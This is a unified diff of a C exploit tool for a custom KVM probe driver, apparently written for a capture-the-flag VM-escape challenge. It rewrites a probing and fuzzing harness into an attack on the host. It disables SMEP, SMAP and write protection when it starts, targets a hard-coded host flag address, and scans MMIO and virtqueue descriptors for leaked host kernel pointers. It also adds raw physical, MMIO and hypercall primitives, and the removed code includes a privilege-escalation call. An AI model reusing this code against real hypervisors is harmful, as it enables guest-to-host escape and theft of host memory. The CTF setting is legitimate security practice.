@@ -61,6 +61,30 @@
 #define DEVICE_FILE "/dev/kvm_probe_dev"
 #define MAX_SYMBOL_NAME 128
 
+/* ========================================================================
+ * CTF-SPECIFIC CONSTANTS
+ * ======================================================================== */
+
+/* Host flag address - THIS IS THE TARGET */
+#define HOST_FLAG_ADDR 0xffffffff826279a8UL
+
+/* Common MMIO base addresses for virtio/KVM devices */
+#define VIRTIO_MMIO_BASE_1  0xfeb00000UL
+#define VIRTIO_MMIO_BASE_2  0xfea00000UL
+#define VIRTIO_MMIO_BASE_3  0xfe000000UL
+
+/* PCI MMIO regions that might leak to host */
+#define PCI_MMIO_START      0xe0000000UL
+#define PCI_MMIO_END        0xfec00000UL
+
+/* LAPIC/IOAPIC regions */
+#define LAPIC_BASE          0xfee00000UL
+#define IOAPIC_BASE         0xfec00000UL
+
+/* Kernel direct mapping offsets */
+#define KERNEL_TEXT_BASE    0xffffffff80000000UL
+#define DIRECT_MAP_START    0xffff888000000000UL
+
 /* Structures */
 struct port_io_data {
     unsigned short port;
@@ -126,39 +150,44 @@ struct physical_rw {
     unsigned char *user_buffer;
 };
 
-/* Leak detection structure */
-struct leak_candidate {
-    unsigned long addr;
-    unsigned char data[16];
-    int confidence;
-    char source[64];
-};
-
 /* Global variables */
 static int fd = -1;
-static volatile int crash_monitor_running = 0;
-static pthread_t crash_thread;
-static FILE *vq_fuzz_log = NULL;
-static FILE *msr_fuzz_log = NULL;
-static FILE *dma_probe_log = NULL;
-static FILE *leak_log = NULL;
+static FILE *exploit_log = NULL;
+static unsigned long g_guest_kaslr_slide = 0;
+static unsigned long g_host_kaslr_slide = 0;  /* If we can leak it */
+static unsigned long g_vq_pfn = 0;
 
-static struct leak_candidate g_leak_candidates[100];
-static int g_leak_count = 0;
+/* Potential host pointer leaks */
+struct host_leak {
+    unsigned long addr;           /* Where we found it */
+    unsigned long leaked_value;   /* The leaked pointer/value */
+    char source[64];              /* How we found it */
+    int confidence;               /* 1-10 */
+};
 
-/* Helper: minimum function */
-static size_t min(size_t a, size_t b) {
-    return a < b ? a : b;
-}
+static struct host_leak g_host_leaks[256];
+static int g_host_leak_count = 0;
 
-/* Utility: safe write to log */
-static void safe_log(FILE *f, const char *fmt, ...) {
-    if (!f) return;
+/* ========================================================================
+ * UTILITY FUNCTIONS
+ * ======================================================================== */
+
+static void safe_log(const char *fmt, ...) {
     va_list ap;
     va_start(ap, fmt);
-    vfprintf(f, fmt, ap);
-    fflush(f);
+    vprintf(fmt, ap);
     va_end(ap);
+    
+    if (exploit_log) {
+        va_start(ap, fmt);
+        vfprintf(exploit_log, fmt, ap);
+        fflush(exploit_log);
+        va_end(ap);
+    }
+}
+
+static size_t min_size(size_t a, size_t b) {
+    return a < b ? a : b;
 }
 
 /* Initialize the driver connection */
@@ -168,151 +197,68 @@ int init_driver(void) {
         perror("Failed to open device");
         return -1;
     }
+    
+    exploit_log = fopen("exploit.log", "a");
     srand(time(NULL) ^ getpid());
-    printf("[+] Driver initialized\n");
-    return 0;
-}
-
-/* Automatically disable protections before operations */
-static void auto_disable_protections(void) {
+    
+    /* Get guest KASLR slide */
+    if (ioctl(fd, IOCTL_GET_KASLR_SLIDE, &g_guest_kaslr_slide) == 0) {
+        safe_log("[+] Guest KASLR slide: 0x%lx\n", g_guest_kaslr_slide);
+    }
+    
+    /* Disable protections */
     ioctl(fd, IOCTL_DISABLE_SMEP, 0);
     ioctl(fd, IOCTL_DISABLE_SMAP, 0);
     ioctl(fd, IOCTL_DISABLE_WP, 0);
+    
+    safe_log("[+] Driver initialized, protections disabled\n");
+    return 0;
 }
 
-/* ========================================================================
- * ENHANCED DISPLAY FUNCTIONS
- * ======================================================================== */
-
-/* Convert hex string to bytes (handles little-endian) */
-static int hex_to_bytes(const char *hex_str, unsigned char *bytes, size_t max_len) {
-    size_t hex_len = strlen(hex_str);
-    if (hex_len % 2 != 0) return -1;
-    
-    size_t byte_len = hex_len / 2;
-    if (byte_len > max_len) return -1;
-    
-    for (size_t i = 0; i < byte_len; i++) {
-        sscanf(hex_str + (2 * i), "%2hhx", &bytes[i]);
+/* Check if a value looks like a host kernel pointer */
+static int looks_like_host_kernel_ptr(unsigned long value) {
+    /* Host kernel text: 0xffffffff80000000 - 0xffffffffa0000000 */
+    if (value >= 0xffffffff80000000UL && value < 0xffffffffa0000000UL) {
+        return 1;
     }
-    
-    return byte_len;
+    /* Host direct mapping: 0xffff888000000000 - 0xffffc88000000000 */
+    if (value >= 0xffff888000000000UL && value < 0xffffc88000000000UL) {
+        return 2;
+    }
+    /* Host module space: 0xffffffffa0000000 - 0xffffffffc0000000 */
+    if (value >= 0xffffffffa0000000UL && value < 0xffffffffc0000000UL) {
+        return 3;
+    }
+    return 0;
 }
 
-/* Check if buffer contains trigger pattern (supports ASCII and hex) */
-static int contains_trigger(unsigned char *buf, size_t buf_len, const char *trigger, 
-                           unsigned long *match_offset) {
-    size_t trigger_len = strlen(trigger);
+/* Record a potential host leak */
+static void record_host_leak(unsigned long addr, unsigned long value, const char *source, int confidence) {
+    if (g_host_leak_count >= 256) return;
     
-    /* Try ASCII match first */
-    for (size_t i = 0; i <= buf_len - trigger_len; i++) {
-        if (memcmp(buf + i, trigger, trigger_len) == 0) {
-            *match_offset = i;
-            return 1; /* ASCII match */
-        }
-    }
+    struct host_leak *leak = &g_host_leaks[g_host_leak_count++];
+    leak->addr = addr;
+    leak->leaked_value = value;
+    strncpy(leak->source, source, 63);
+    leak->source[63] = '\0';
+    leak->confidence = confidence;
     
-    /* Try hex match (little-endian) */
-    unsigned char hex_bytes[16];
-    int hex_len = hex_to_bytes(trigger, hex_bytes, sizeof(hex_bytes));
+    int type = looks_like_host_kernel_ptr(value);
+    const char *type_str = (type == 1) ? "kernel_text" : 
+                          (type == 2) ? "direct_map" : 
+                          (type == 3) ? "module" : "unknown";
     
-    if (hex_len > 0 && (size_t)hex_len <= buf_len) {
-        for (size_t i = 0; i <= buf_len - hex_len; i++) {
-            if (memcmp(buf + i, hex_bytes, hex_len) == 0) {
-                *match_offset = i;
-                return 2; /* Hex match */
-            }
-        }
-    }
-    
-    return 0; /* No match */
+    safe_log("[!] HOST LEAK #%d: addr=0x%lx value=0x%lx type=%s source=%s confidence=%d\n",
+             g_host_leak_count, addr, value, type_str, source, confidence);
 }
 
-/* Display memory in enhanced format with hex + ASCII */
-static void display_memory(unsigned char *buf, unsigned long addr, size_t size, 
-                          const char *trigger, unsigned long head, unsigned long tail) {
-    if (!buf || size == 0) return;
-    
-    unsigned long start_addr = addr;
-    unsigned long end_addr = addr + size;
-    
-    /* If trigger is specified, find it first */
-    if (trigger && strlen(trigger) > 0) {
-        int found = 0;
+/* Display hex dump with ASCII */
+static void hexdump(unsigned char *buf, unsigned long addr, size_t size) {
+    for (size_t offset = 0; offset < size; offset += 16) {
+        printf("0x%lx: ", addr + offset);
         
-        for (unsigned long offset = 0; offset < size; offset += 16) {
-            unsigned long current_addr = addr + offset;
-            size_t line_size = (offset + 16 <= size) ? 16 : (size - offset);
-            
-            unsigned long match_offset;
-            int match_type = contains_trigger(buf + offset, line_size, trigger, &match_offset);
-            
-            if (match_type > 0) {
-                if (!found) {
-                    if (match_type == 1) {
-                        printf("!!!Trigger found %s at 0x%lx\n", trigger, current_addr + match_offset);
-                    } else {
-                        printf("!!!Trigger found %s(little endian) at 0x%lx\n", trigger, current_addr + match_offset);
-                    }
-                    found = 1;
-                }
-                
-                /* Calculate head and tail ranges */
-                unsigned long head_start = (current_addr >= head) ? (current_addr - head) : addr;
-                unsigned long tail_end = (current_addr + 16 + tail <= end_addr) ? 
-                                        (current_addr + 16 + tail) : end_addr;
-                
-                /* Adjust to 16-byte boundaries */
-                head_start = (head_start / 16) * 16;
-                tail_end = ((tail_end + 15) / 16) * 16;
-                if (tail_end > end_addr) tail_end = end_addr;
-                
-                /* Display from head to tail */
-                for (unsigned long disp_addr = head_start; disp_addr < tail_end; disp_addr += 16) {
-                    unsigned long disp_offset = disp_addr - addr;
-                    size_t disp_size = (disp_offset + 16 <= size) ? 16 : (size - disp_offset);
-                    
-                    printf("0x%lx: ", disp_addr);
-                    
-                    /* Hex bytes */
-                    for (size_t i = 0; i < 16; i++) {
-                        if (i < disp_size) {
-                            printf("%02x ", buf[disp_offset + i]);
-                        } else {
-                            printf("   ");
-                        }
-                    }
-                    
-                    printf("  |  ");
-                    
-                    /* ASCII representation */
-                    for (size_t i = 0; i < disp_size; i++) {
-                        unsigned char c = buf[disp_offset + i];
-                        printf("%c", isprint(c) ? c : '.');
-                    }
-                    
-                    printf("\n");
-                }
-                
-                return; /* Only show first match with context */
-            }
-        }
-        
-        if (!found) {
-            printf("[-] Trigger '%s' not found in scanned range\n", trigger);
-        }
-        
-        return;
-    }
-    
-    /* No trigger - display all */
-    for (unsigned long offset = 0; offset < size; offset += 16) {
-        unsigned long current_addr = addr + offset;
         size_t line_size = (offset + 16 <= size) ? 16 : (size - offset);
         
-        printf("0x%lx: ", current_addr);
-        
-        /* Hex bytes */
         for (size_t i = 0; i < 16; i++) {
             if (i < line_size) {
                 printf("%02x ", buf[offset + i]);
@@ -321,9 +267,8 @@ static void display_memory(unsigned char *buf, unsigned long addr, size_t size,
             }
         }
         
-        printf("  |  ");
+        printf(" | ");
         
-        /* ASCII representation */
         for (size_t i = 0; i < line_size; i++) {
             unsigned char c = buf[offset + i];
             printf("%c", isprint(c) ? c : '.');
@@ -334,157 +279,28 @@ static void display_memory(unsigned char *buf, unsigned long addr, size_t size,
 }
 
 /* ========================================================================
- * ADAPTIVE LEAK DETECTION FUNCTIONS
+ * CORE MEMORY OPERATIONS
  * ======================================================================== */
 
-/* Check if data looks like a kernel pointer */
-static int looks_like_kernel_pointer(unsigned long value) {
-    /* Kernel pointers typically in these ranges */
-    if (value >= 0xffff800000000000UL && value <= 0xffffffffffffffffUL) {
-        return 1;
-    }
-    return 0;
-}
-
-/* Analyze memory for potential leaks */
-static int analyze_for_leaks(unsigned char *buf, size_t size, unsigned long base_addr, const char *source) {
-    int leaks_found = 0;
-    
-    for (size_t i = 0; i <= size - 8; i++) {
-        unsigned long value = *(unsigned long *)(buf + i);
-        
-        if (looks_like_kernel_pointer(value)) {
-            if (g_leak_count < 100) {
-                struct leak_candidate *leak = &g_leak_candidates[g_leak_count];
-                leak->addr = base_addr + i;
-                memcpy(leak->data, buf + i, 16);
-                leak->confidence = 1;
-                snprintf(leak->source, sizeof(leak->source), "%s", source);
-                
-                printf("[!] POTENTIAL LEAK at 0x%lx: 0x%lx (from %s)\n", 
-                       leak->addr, value, source);
-                
-                if (leak_log) {
-                    fprintf(leak_log, "[!] POTENTIAL LEAK at 0x%lx: 0x%lx (from %s)\n", 
-                           leak->addr, value, source);
-                    fflush(leak_log);
-                }
-                
-                g_leak_count++;
-                leaks_found++;
-            }
-        }
-    }
-    
-    return leaks_found;
-}
-
-/* Safe memory read with leak detection */
-static int safe_read_with_leak_check(unsigned long addr, size_t size, const char *source) {
-    unsigned char *buf = malloc(size);
-    if (!buf) return -1;
-    
-    struct physical_rw req = {
-        .phys_addr = addr,
-        .size = size,
-        .user_buffer = buf
-    };
-    
-    if (ioctl(fd, IOCTL_READ_PHYSICAL, &req) < 0) {
-        free(buf);
-        return -1;
-    }
-    
-    int leaks = analyze_for_leaks(buf, size, addr, source);
-    free(buf);
-    return leaks;
-}
-
-/* Check if system is still responsive */
-static int check_system_health(void) {
-    /* Try a simple read operation */
-    unsigned long test_addr = 0x1000;
-    unsigned char buf[16];
-    
-    struct physical_rw req = {
-        .phys_addr = test_addr,
-        .size = sizeof(buf),
-        .user_buffer = buf
-    };
-    
-    if (ioctl(fd, IOCTL_READ_PHYSICAL, &req) < 0) {
-        return 0; /* System may be compromised */
-    }
-    
-    return 1; /* System responsive */
-}
-
-/* ========================================================================
- * ENHANCED MEMORY OPERATIONS
- * ======================================================================== */
-
-void read_kernel_mem(unsigned long addr, unsigned long size, const char *trigger, 
-                     unsigned long head, unsigned long tail) {
-    auto_disable_protections();
-    
-    unsigned char *buf = malloc(size);
-    if (!buf) {
-        perror("malloc failed");
-        return;
-    }
-
-    struct kvm_kernel_mem_read req = {
-        .kernel_addr = addr,
-        .length = size,
-        .user_buf = buf
-    };
-
-    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
-        perror("read_kernel_mem failed");
-        free(buf);
-        return;
-    }
-
-    display_memory(buf, addr, size, trigger, head, tail);
-    free(buf);
-}
-
-void read_physical_mem(unsigned long phys_addr, unsigned long size, const char *trigger,
-                       unsigned long head, unsigned long tail) {
-    auto_disable_protections();
-    
-    unsigned char *buf = malloc(size);
-    if (!buf) {
-        perror("malloc failed");
-        return;
-    }
-
+static int read_physical(unsigned long phys_addr, unsigned char *buf, size_t size) {
     struct physical_rw req = {
         .phys_addr = phys_addr,
         .size = size,
         .user_buffer = buf
     };
-
-    if (ioctl(fd, IOCTL_READ_PHYSICAL, &req) < 0) {
-        perror("read_physical_mem failed");
-        free(buf);
-        return;
-    }
-
-    display_memory(buf, phys_addr, size, trigger, head, tail);
-    free(buf);
+    return ioctl(fd, IOCTL_READ_PHYSICAL, &req);
 }
 
-void read_mmio(unsigned long phys_addr, unsigned long size, const char *trigger,
-               unsigned long head, unsigned long tail) {
-    auto_disable_protections();
-    
-    unsigned char *buf = malloc(size);
-    if (!buf) {
-        perror("malloc failed");
-        return;
-    }
+static int write_physical(unsigned long phys_addr, unsigned char *buf, size_t size) {
+    struct physical_rw req = {
+        .phys_addr = phys_addr,
+        .size = size,
+        .user_buffer = buf
+    };
+    return ioctl(fd, IOCTL_WRITE_PHYSICAL, &req);
+}
 
+static int read_mmio(unsigned long phys_addr, unsigned char *buf, size_t size) {
     struct mmio_data req = {
         .phys_addr = phys_addr,
         .size = size,
@@ -492,476 +308,53 @@ void read_mmio(unsigned long phys_addr, unsigned long size, const char *trigger,
         .single_value = 0,
         .value_size = 0
     };
-
-    if (ioctl(fd, IOCTL_READ_MMIO, &req) < 0) {
-        perror("read_mmio failed");
-        free(buf);
-        return;
-    }
-
-    display_memory(buf, phys_addr, size, trigger, head, tail);
-    free(buf);
+    return ioctl(fd, IOCTL_READ_MMIO, &req);
 }
 
-/* ========================================================================
- * SCAN OPERATIONS
- * ======================================================================== */
-
-void scan_physical_mem(unsigned long start_addr, unsigned long end_addr, const char *trigger,
-                       unsigned long head, unsigned long tail) {
-    auto_disable_protections();
-    
-    if (end_addr <= start_addr) {
-        printf("[-] Error: end address must be greater than start address\n");
-        return;
-    }
-    
-    unsigned long size = end_addr - start_addr;
-    unsigned char *buf = malloc(size);
-    if (!buf) {
-        perror("malloc failed");
-        return;
-    }
-
-    struct physical_rw req = {
-        .phys_addr = start_addr,
-        .size = size,
-        .user_buffer = buf
-    };
-
-    if (ioctl(fd, IOCTL_READ_PHYSICAL, &req) < 0) {
-        perror("scan_physical_mem failed");
-        free(buf);
-        return;
-    }
-
-    display_memory(buf, start_addr, size, trigger, head, tail);
-    free(buf);
-}
-
-void scan_kernel_mem(unsigned long start_addr, unsigned long end_addr, const char *trigger,
-                     unsigned long head, unsigned long tail) {
-    auto_disable_protections();
-    
-    if (end_addr <= start_addr) {
-        printf("[-] Error: end address must be greater than start address\n");
-        return;
-    }
-    
-    unsigned long size = end_addr - start_addr;
-    unsigned char *buf = malloc(size);
-    if (!buf) {
-        perror("malloc failed");
-        return;
-    }
-
-    struct kvm_kernel_mem_read req = {
-        .kernel_addr = start_addr,
-        .length = size,
-        .user_buf = buf
-    };
-
-    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
-        perror("scan_kernel_mem failed");
-        free(buf);
-        return;
-    }
-
-    display_memory(buf, start_addr, size, trigger, head, tail);
-    free(buf);
-}
-
-void scan_mmio(unsigned long start_addr, unsigned long end_addr, const char *trigger,
-               unsigned long head, unsigned long tail) {
-    auto_disable_protections();
-    
-    if (end_addr <= start_addr) {
-        printf("[-] Error: end address must be greater than start address\n");
-        return;
-    }
-    
-    unsigned long size = end_addr - start_addr;
-    unsigned char *buf = malloc(size);
-    if (!buf) {
-        perror("malloc failed");
-        return;
-    }
-
-    struct mmio_data req = {
-        .phys_addr = start_addr,
-        .size = size,
-        .user_buffer = buf,
-        .single_value = 0,
-        .value_size = 0
-    };
-
-    if (ioctl(fd, IOCTL_READ_MMIO, &req) < 0) {
-        perror("scan_mmio failed");
-        free(buf);
-        return;
-    }
-
-    display_memory(buf, start_addr, size, trigger, head, tail);
-    free(buf);
-}
-
-/* ========================================================================
- * WRITE OPERATIONS
- * ======================================================================== */
-
-void write_kernel_mem(unsigned long addr, unsigned char *data, unsigned long size) {
-    auto_disable_protections();
-    
-    struct kvm_kernel_mem_write req = {
-        .kernel_addr = addr,
-        .length = size,
-        .user_buf = data
-    };
-
-    if (ioctl(fd, IOCTL_WRITE_KERNEL_MEM, &req) < 0) {
-        perror("write_kernel_mem failed");
-        return;
-    }
-
-    printf("[+] Wrote %lu bytes to kernel address 0x%lx\n", size, addr);
-}
-
-void write_physical_mem(unsigned long phys_addr, unsigned char *data, unsigned long size) {
-    auto_disable_protections();
-    
-    struct physical_rw req = {
-        .phys_addr = phys_addr,
-        .size = size,
-        .user_buffer = data
-    };
-
-    if (ioctl(fd, IOCTL_WRITE_PHYSICAL, &req) < 0) {
-        perror("write_physical_mem failed");
-        return;
-    }
-
-    printf("[+] Wrote %lu bytes to physical address 0x%lx\n", size, phys_addr);
-}
-
-void patch_kernel(unsigned long addr, unsigned char *code, unsigned long size) {
-    auto_disable_protections();
-    
-    struct patch_req req = {
-        .dst_va = addr,
-        .size = size,
-        .user_buf = code
-    };
-
-    if (ioctl(fd, IOCTL_PATCH_INSTRUCTIONS, &req) < 0) {
-        perror("patch_kernel failed");
-        return;
-    }
-
-    printf("[+] Patched %lu bytes at kernel address 0x%lx\n", size, addr);
-}
-
-void write_mmio(unsigned long phys_addr, unsigned long size, unsigned long value) {
-    auto_disable_protections();
-    
+static int write_mmio_value(unsigned long phys_addr, unsigned long value, unsigned int size) {
     struct mmio_data req = {
         .phys_addr = phys_addr,
-        .size = size,
+        .size = 0,
         .user_buffer = NULL,
         .single_value = value,
         .value_size = size
     };
-
-    if (ioctl(fd, IOCTL_WRITE_MMIO, &req) < 0) {
-        perror("write_mmio failed");
-        return;
-    }
-
-    printf("[+] Wrote 0x%lx to MMIO address 0x%lx (size=%lu)\n", value, phys_addr, size);
+    return ioctl(fd, IOCTL_WRITE_MMIO, &req);
 }
 
-/* ========================================================================
- * CORE COMMANDS
- * ======================================================================== */
-
-void virt_to_phys(unsigned long va) {
-    unsigned long pa = va;
-    printf("[+] Attempting VIRT_TO_PHYS: 0x%lx\n", va);
-    if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &pa) < 0) {
-        perror("virt_to_phys failed");
-        return;
-    }
-    printf("[+] Virtual 0x%lx -> Physical 0x%lx\n", va, pa);
-}
-
-void alloc_vq_page(void) {
-    unsigned long pfn;
+static unsigned long alloc_vq_page(void) {
+    unsigned long pfn = 0;
     if (ioctl(fd, IOCTL_ALLOC_VQ_PAGE, &pfn) < 0) {
-        perror("alloc_vq_page failed");
-        return;
+        return 0;
     }
-    printf("[+] Allocated VQ page at PFN: 0x%lx\n", pfn);
+    g_vq_pfn = pfn;
+    return pfn;
 }
 
-void free_vq_page(void) {
-    if (ioctl(fd, IOCTL_FREE_VQ_PAGE, 0) < 0) {
-        perror("free_vq_page failed");
-        return;
-    }
-    printf("[+] Freed VQ page\n");
+static void free_vq_page(void) {
+    ioctl(fd, IOCTL_FREE_VQ_PAGE, 0);
+    g_vq_pfn = 0;
 }
 
-/* ========================================================================
- * REGISTER OPERATIONS
- * ======================================================================== */
-
-void read_efer(void) {
-    unsigned long long efer;
-    if (ioctl(fd, IOCTL_READ_EFER, &efer) < 0) {
-        perror("read_efer failed");
-        return;
-    }
-    printf("[+] EFER = 0x%llx\n", efer);
-    printf("[+] NX bit (EFER.NXE): %s\n", (efer & (1ULL << 11)) ? "ENABLED" : "DISABLED");
-}
-
-void enable_nx(void) {
-    unsigned long long before = 0, after = 0;
-    if (ioctl(fd, IOCTL_READ_EFER, &before) < 0) {
-        perror("enable_nx: read EFER failed (before)");
-        return;
-    }
-    printf("[*] EFER before: 0x%llx (NXE=%s)\n", before, (before & (1ULL<<11)) ? "1" : "0");
-    if (ioctl(fd, IOCTL_ENABLE_NX, 0) < 0) {
-        perror("enable_nx failed");
-        return;
-    }
-    if (ioctl(fd, IOCTL_READ_EFER, &after) < 0) {
-        perror("enable_nx: read EFER failed (after)");
-        return;
-    }
-    printf("[+] EFER after:  0x%llx (NXE=%s)\n", after, (after & (1ULL<<11)) ? "1" : "0");
-    if ( (before & (1ULL<<11)) == 0 && (after & (1ULL<<11)) != 0 ) {
-        printf("[+] NX bit successfully enabled\n");
-    } else if ((after & (1ULL<<11)) != 0) {
-        printf("[+] NX bit already enabled\n");
-    } else {
-        printf("[-] NX bit NOT enabled (driver/hypervisor may have blocked the change)\n");
-    }
-}
-
-void disable_nx(void) {
-    unsigned long long before = 0, after = 0;
-    if (ioctl(fd, IOCTL_READ_EFER, &before) < 0) {
-        perror("disable_nx: read EFER failed (before)");
-        return;
-    }
-    printf("[*] EFER before: 0x%llx (NXE=%s)\n", before, (before & (1ULL<<11)) ? "1" : "0");
-    if (ioctl(fd, IOCTL_DISABLE_NX, 0) < 0) {
-        perror("disable_nx failed");
-        return;
-    }
-    if (ioctl(fd, IOCTL_READ_EFER, &after) < 0) {
-        perror("disable_nx: read EFER failed (after)");
-        return;
-    }
-    printf("[+] EFER after:  0x%llx (NXE=%s)\n", after, (after & (1ULL<<11)) ? "1" : "0");
-    if ( (before & (1ULL<<11)) != 0 && (after & (1ULL<<11)) == 0 ) {
-        printf("[+] NX bit successfully disabled\n");
-    } else if ((after & (1ULL<<11)) == 0) {
-        printf("[+] NX bit already disabled\n");
-    } else {
-        printf("[-] NX bit NOT disabled (driver/hypervisor may have blocked the change)\n");
-    }
-}
-
-void read_cr0(void) {
-    unsigned long cr0;
-    if (ioctl(fd, IOCTL_READ_CR0, &cr0) < 0) {
-        perror("read_cr0 failed");
-        return;
-    }
-    printf("[+] CR0 = 0x%lx\n", cr0);
-    printf("[+] WP bit (CR0.WP): %s\n", (cr0 & (1UL << 16)) ? "ENABLED" : "DISABLED");
-}
-
-void write_cr0(unsigned long value) {
-    if (ioctl(fd, IOCTL_WRITE_CR0, &value) < 0) {
-        perror("write_cr0 failed");
-        return;
-    }
-    printf("[+] CR0 written with 0x%lx\n", value);
-}
-
-void read_cr4(void) {
-    unsigned long cr4;
-    if (ioctl(fd, IOCTL_READ_CR4, &cr4) < 0) {
-        perror("read_cr4 failed");
-        return;
-    }
-    printf("[+] CR4 = 0x%lx\n", cr4);
-    printf("[+] SMEP bit (CR4.SMEP): %s\n", (cr4 & (1UL << 20)) ? "ENABLED" : "DISABLED");
-    printf("[+] SMAP bit (CR4.SMAP): %s\n", (cr4 & (1UL << 21)) ? "ENABLED" : "DISABLED");
-}
-
-void write_cr4(unsigned long value) {
-    if (ioctl(fd, IOCTL_WRITE_CR4, &value) < 0) {
-        perror("write_cr4 failed");
-        return;
-    }
-    printf("[+] CR4 written with 0x%lx\n", value);
-}
-
-void read_msr(unsigned int msr) {
-    struct msr_data req = { .msr = msr, .value = 0 };
-    if (ioctl(fd, IOCTL_READ_MSR, &req) < 0) {
-        perror("read_msr failed");
-        return;
-    }
-    printf("[+] MSR 0x%x = 0x%llx\n", msr, req.value);
-}
-
-void write_msr(unsigned int msr, unsigned long long value) {
-    struct msr_data req = { .msr = msr, .value = value };
-    if (ioctl(fd, IOCTL_WRITE_MSR, &req) < 0) {
-        perror("write_msr failed");
-        return;
-    }
-    printf("[+] MSR 0x%x written with 0x%llx\n", msr, value);
-}
-
-void enable_smep(void) {
-    if (ioctl(fd, IOCTL_ENABLE_SMEP, 0) < 0) {
-        perror("enable_smep failed");
-        return;
-    }
-    printf("[+] SMEP enabled\n");
-}
-
-void enable_smap(void) {
-    if (ioctl(fd, IOCTL_ENABLE_SMAP, 0) < 0) {
-        perror("enable_smap failed");
-        return;
-    }
-    printf("[+] SMAP enabled\n");
-}
-
-void enable_wp(void) {
-    if (ioctl(fd, IOCTL_ENABLE_WP, 0) < 0) {
-        perror("enable_wp failed");
-        return;
-    }
-    printf("[+] Write Protection enabled\n");
-}
-
-/* ========================================================================
- * I/O OPERATIONS
- * ======================================================================== */
-
-void read_port(unsigned short port, unsigned int size) {
-    struct port_io_data req = {
-        .port = port,
-        .size = size,
-        .value = 0
+static int write_vq_desc(uint16_t index, uint64_t phys_addr, uint32_t len, 
+                         uint16_t flags, uint16_t next_idx) {
+    struct vq_desc_user_data desc = {
+        .index = index,
+        .phys_addr = phys_addr,
+        .len = len,
+        .flags = flags,
+        .next_idx = next_idx
     };
-
-    if (ioctl(fd, IOCTL_READ_PORT, &req) < 0) {
-        perror("read_port failed");
-        return;
-    }
-
-    printf("[+] Read from port 0x%x (size=%u): 0x%x\n", port, size, req.value);
+    return ioctl(fd, IOCTL_WRITE_VQ_DESC, &desc);
 }
 
-void write_port(unsigned short port, unsigned int size, unsigned int value) {
-    struct port_io_data req = {
-        .port = port,
-        .size = size,
-        .value = value
-    };
-
-    if (ioctl(fd, IOCTL_WRITE_PORT, &req) < 0) {
-        perror("write_port failed");
-        return;
-    }
-
-    printf("[+] Wrote 0x%x to port 0x%x (size=%u)\n", value, port, size);
+static long trigger_hypercall(void) {
+    long ret = 0;
+    ioctl(fd, IOCTL_TRIGGER_HYPERCALL, &ret);
+    return ret;
 }
 
-/* ========================================================================
- * SYMBOL AND INFO COMMANDS  
- * ======================================================================== */
-
-void lookup_symbol(const char *symbol_name) {
-    struct symbol_lookup req;
-    strncpy(req.name, symbol_name, MAX_SYMBOL_NAME - 1);
-    req.name[MAX_SYMBOL_NAME - 1] = '\0';
-
-    if (ioctl(fd, IOCTL_LOOKUP_SYMBOL, &req) < 0) {
-        perror("lookup_symbol failed");
-        return;
-    }
-
-    printf("[+] Symbol '%s' is at address 0x%lx\n", symbol_name, req.address);
-}
-
-void get_kernel_base(void) {
-    unsigned long base;
-    if (ioctl(fd, IOCTL_GET_KERNEL_BASE, &base) < 0) {
-        perror("get_kernel_base failed");
-        return;
-    }
-    printf("[+] Kernel base address: 0x%lx\n", base);
-}
-
-void get_kaslr_slide(void) {
-    unsigned long slide;
-    if (ioctl(fd, IOCTL_GET_KASLR_SLIDE, &slide) < 0) {
-        perror("get_kaslr_slide failed");
-        return;
-    }
-    printf("[+] KASLR slide: 0x%lx\n", slide);
-}
-
-void get_current_task(void) {
-    unsigned long task;
-    if (ioctl(fd, IOCTL_GET_CURRENT_TASK, &task) < 0) {
-        perror("get_current_task failed");
-        return;
-    }
-    printf("[+] Current task_struct: 0x%lx\n", task);
-}
-
-void escalate_privileges(void) {
-    if (ioctl(fd, IOCTL_ESCALATE_PRIVILEGES, 0) < 0) {
-        perror("escalate_privileges failed");
-        return;
-    }
-    printf("[+] Privilege escalation attempted\n");
-}
-
-void check_status(void) {
-    unsigned long status;
-    if (ioctl(fd, IOCTL_CHECK_STATUS, &status) < 0) {
-        perror("check_status failed");
-        return;
-    }
-    printf("[+] Driver status: 0x%lx\n", status);
-}
-
-/* ========================================================================
- * HYPERCALL COMMANDS
- * ======================================================================== */
-
-void trigger_hypercall(void) {
-    long ret;
-    if (ioctl(fd, IOCTL_TRIGGER_HYPERCALL, &ret) < 0) {
-        perror("trigger_hypercall failed");
-        return;
-    }
-    printf("[+] Hypercall triggered, returned: %ld\n", ret);
-}
-
-void hypercall_with_args(unsigned long nr, unsigned long a0, unsigned long a1,
+static long do_hypercall(unsigned long nr, unsigned long a0, unsigned long a1,
                          unsigned long a2, unsigned long a3) {
     struct hypercall_args args = {
         .nr = nr,
@@ -970,788 +363,660 @@ void hypercall_with_args(unsigned long nr, unsigned long a0, unsigned long a1,
         .arg2 = a2,
         .arg3 = a3
     };
-
     if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &args) < 0) {
-        perror("hypercall_with_args failed");
-        return;
+        return -1;
     }
-
-    printf("[+] Hypercall %lu executed with args: 0x%lx 0x%lx 0x%lx 0x%lx\n",
-           nr, a0, a1, a2, a3);
+    return (long)args.nr; /* Return value is stored back */
 }
 
 /* ========================================================================
- * SECTION 5: AUTOMATION HARNESSES (Original VQ/DMA/MSR Fuzzing)
+ * CTF ATTACK VECTOR 1: MMIO PROBING FOR HOST MEMORY LEAKS
  * ======================================================================== */
 
-void vq_fuzz(int iterations, int max_index, int mode, int trigger_every) {
-    if (!vq_fuzz_log) {
-        vq_fuzz_log = fopen("vq_fuzz.log", "a");
-        if (!vq_fuzz_log) {
-            perror("vq_fuzz: fopen");
-            return;
-        }
-    }
-
-    safe_log(vq_fuzz_log, "=== vq_fuzz start: iterations=%d max_index=%d mode=%d trigger_every=%d ===\n",
-             iterations, max_index, mode, trigger_every);
-
-    alloc_vq_page();
-    for (int i = 0; i < iterations; i++) {
-        struct vq_desc_user_data desc;
-        memset(&desc, 0, sizeof(desc));
-
-        if (mode == 0) {
-            /* random */
-            desc.index = rand() % (max_index + 1);
-            desc.phys_addr = ((uint64_t)rand() << 32) ^ rand();
-            desc.len = (uint32_t)rand();
-            desc.flags = rand() & 0xffff;
-            desc.next_idx = rand() % (max_index + 1);
-        } else if (mode == 1) {
-            /* patterned */
-            int pattern = i % 4;
-            desc.index = pattern % (max_index + 1);
-            if (pattern == 0) desc.len = 0;
-            else if (pattern == 1) desc.len = 0xffffffff;
-            else if (pattern == 2) desc.len = 0x80000000;
-            else desc.len = 0xfffffffe;
-            desc.phys_addr = (uint64_t)0x1000 * (i + 1);
-            desc.flags = 0;
